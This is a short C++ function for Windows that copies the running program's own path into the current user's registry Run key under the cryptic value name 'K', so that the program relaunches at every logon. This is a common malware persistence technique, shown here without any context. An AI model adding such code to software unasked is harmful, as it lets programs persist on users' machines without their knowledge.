#include <Windows.h>
#include <iostream>
void persistent() {
    wchar_t executablePath[MAX_PATH];
    GetModuleFileNameW(NULL, executablePath, MAX_PATH);
    const wchar_t* regKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;
    LONG openResult = RegOpenKeyExW(HKEY_CURRENT_USER, regKeyPath, 0, KEY_WRITE, &hKey);
    if (openResult == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"K", 0, REG_SZ, (BYTE*)executablePath, (wcslen(executablePath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
        std::wcout << L"K" << std::endl;
    } else {
        std::wcerr << L"K" << std::endl;
    }
}